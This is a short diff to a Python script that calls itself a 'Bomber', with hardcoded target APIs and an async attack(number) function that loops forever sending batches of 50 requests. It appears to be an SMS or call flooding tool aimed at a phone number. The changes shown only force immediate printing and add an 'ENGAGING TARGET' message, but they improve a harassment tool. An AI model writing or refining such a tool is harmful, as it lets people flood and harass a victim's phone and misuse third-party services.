@@ -6,6 +6,7 @@ import os
 import sys
 
 # vULTRA: The "Naked" Bomber (No Bloat, Pure Speed)
+sys.stdout.reconfigure(line_buffering=True) # Force Print immediately
 
 # 1. HARDCODED TARGETS (The "Magnificent Seven")
 APIS = [
@@ -70,6 +71,7 @@ async def attack(number):
     print("Press Ctrl+C to Stop")
     
     async with aiohttp.ClientSession() as session:
+        print("🔥 [ULTRA] ENGAGING TARGET...")
         while True:
             tasks = []
             # Batch of 50
